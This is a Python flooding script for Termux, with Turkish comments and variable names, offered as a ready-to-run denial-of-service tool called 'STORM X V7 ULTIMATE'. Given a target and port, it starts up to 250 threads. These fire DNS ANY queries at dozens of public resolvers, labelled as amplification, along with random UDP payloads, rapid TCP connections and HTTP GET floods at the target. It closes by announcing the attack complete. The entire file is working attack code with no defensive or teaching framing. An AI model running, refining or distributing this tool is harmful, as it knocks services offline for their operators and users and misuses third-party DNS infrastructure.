#!/data/data/com.termux/files/usr/bin/python
import socket,random,time,os,sys,threading,struct

print("\033[91m╔══════════════════════════════╗\n║  STORM X V7 ULTIMATE      ║\n╚══════════════════════════════╝\033[0m")

if len(sys.argv)<3:
    print("python storm.py <HEDEF> <PORT> [SURE] [THREAD]");sys.exit(1)

HEDEF=sys.argv[1];PORT=int(sys.argv[2]);SURE=int(sys.argv[3])if len(sys.argv)>3 else 60
THREAD=min(int(sys.argv[4])if len(sys.argv)>4 else 200,250)

try:HEDEF=socket.gethostbyname(HEDEF)
except:pass

# Global DNS resolver listesi - scope sorunu yok
RESOLVERS=["8.8.8.8","8.8.4.4","1.1.1.1","1.0.0.1","9.9.9.9","208.67.222.222",
"208.67.220.220","77.88.8.8","94.140.14.14","185.228.168.9","114.114.114.114",
"223.5.5.5","64.6.64.6","195.46.39.39","213.73.91.35","80.80.80.80",
"84.200.69.80","37.235.1.174","50.116.23.211","69.195.152.204","74.82.42.42",
"109.69.8.51","45.33.32.156","45.56.119.39","96.126.123.244","66.228.42.39",
"8.26.56.26","8.20.247.20","50.116.31.163","23.253.163.53","45.33.12.148",
"45.33.24.12","96.126.127.27","50.116.28.91","50.116.29.71","45.33.42.205"]

class Flooder(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon=True
        # Her thread kendi UDP socket'ini alir
        self.udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self.udp.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try:self.udp.bind(("0.0.0.0",random.randint(1024,65535)))
        except:self.udp.bind(("0.0.0.0",0))
        # DNS amplification paketleri - 3 farkli domain
        self.pkt1=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x03www\x06google\x03com\x00\x00\xff\x00\x01"
        self.pkt2=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x05yahoo\x03com\x00\x00\xff\x00\x01"
        self.pkt3=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x08facebook\x03com\x00\x00\xff\x00\x01"
        self.pkt4=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x04bing\x03com\x00\x00\xff\x00\x01"
        self.pkt5=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x07twitter\x03com\x00\x00\xff\x00\x01"
        
    def run(self):
        bitis=time.time()+SURE
        sayac=0
        while time.time()<bitis:
            try:
                # Layer 4: UDP DNS Amplification (5 domain x 3 tekrar = 15 paket)
                for _ in range(3):
                    rs=random.choice(RESOLVERS)
                    self.udp.sendto(self.pkt1,(rs,53))
                    self.udp.sendto(self.pkt2,(rs,53))
                    self.udp.sendto(self.pkt3,(rs,53))
                    self.udp.sendto(self.pkt4,(rs,53))
                    self.udp.sendto(self.pkt5,(rs,53))
                    self.udp.sendto(os.urandom(random.randint(1024,4096)),(HEDEF,PORT))
                    sayac+=6
                
                # Layer 4: TCP SYN Flood (hizli connect)
                tcp=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tcp.settimeout(0.01)
                tcp.connect_ex((HEDEF,PORT))
                tcp.send(os.urandom(512))
                tcp.close()
                
                # Layer 7: HTTP Flood (port 80/443)
                if sayac%20==0:
                    for hedef_port in [80,443,8080]:
                        try:
                            http=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                            http.settimeout(0.02)
                            http.connect_ex((HEDEF,hedef_port))
                            http.send(b"GET / HTTP/1.1\r\nHost: "+HEDEF.encode()+b"\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\n\r\n")
                            http.close()
                        except:
                            try:http.close()
                            except:pass
            except:
                pass
        self.udp.close()

print(f"\033[93m[+] Hedef:{HEDEF} Port:{PORT} Sure:{SURE}s Thread:{THREAD}\033[0m")
print("\033[92m[+] Layer4 UDP/TCP + Layer7 HTTP Aktif\033[0m")

# Thread'leri kontrollu baslat - 10'ar 10'ar
aktif=0
for i in range(THREAD):
    try:
        t=Flooder()
        t.start()
        aktif+=1
        if i%10==0:
            time.sleep(0.005)
    except Exception as e:
        print(f"\033[91m[!] Thread {i} baslatilamadi: {e}\033[0m")
        break

print(f"\033[93m[+] {aktif} thread aktif\033[0m")

try:
    time.sleep(SURE)
    print("\033[92m[+] SALDIRI TAMAMLANDI!\033[0m")
except KeyboardInterrupt:
    print("\033[91m[!] KULLANICI TARAFINDAN DURDURULDU\033[0m")
